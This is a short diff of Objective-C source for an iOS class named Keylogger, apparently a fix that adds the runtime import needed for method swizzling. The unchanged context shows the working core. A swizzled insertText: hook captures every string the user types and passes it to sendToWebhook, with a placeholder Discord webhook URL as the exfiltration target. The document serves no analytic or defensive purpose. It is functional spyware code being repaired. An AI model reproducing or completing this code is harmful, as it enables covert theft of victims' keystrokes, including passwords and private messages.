@@ -1,10 +1,13 @@
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
+#import <objc/runtime.h> // <-- THIS LINE IS REQUIRED
 
 @interface Keylogger : NSObject
+
 + (instancetype)sharedInstance;
 - (void)startLogging;
 - (void)sendToWebhook:(NSString *)data;
+
 @end
 
 @implementation Keylogger
@@ -33,6 +36,7 @@ static NSString *webhookURL = @"YOUR_DISCORD_WEBHOOK_URL";
     [self sendToWebhook:text];
     
     // Call original method
+    // Note: Due to swizzling, this actually calls the original 'insertText:' method.
     [self swizzled_insertText:text];
 }
 
